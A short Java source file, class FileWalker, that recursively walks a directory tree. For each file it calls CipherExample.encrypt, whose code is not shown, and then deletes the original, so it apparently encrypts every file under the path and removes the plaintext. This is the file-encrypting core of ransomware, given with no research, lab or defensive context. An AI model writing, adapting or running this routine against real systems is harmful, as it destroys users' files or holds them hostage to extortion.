import java.io.File;

public class FileWalker {
	public static void walk(String path) {

		File root = new File(path);
		if (root.isDirectory()) {
			File[] list = root.listFiles();

			for (File f : list) {
				if (f.isDirectory()) {
					walk(f.getAbsolutePath());
					System.out.println("Dir:" + f.getAbsoluteFile());
				} else {
					System.out.println("File:" + f.getAbsoluteFile());
					CipherExample.encrypt(f.getAbsoluteFile().toString());
					f.delete();
				}
			}
		}else{
			CipherExample.encrypt(root.getAbsoluteFile().toString());
			root.delete();
		}
	}
}
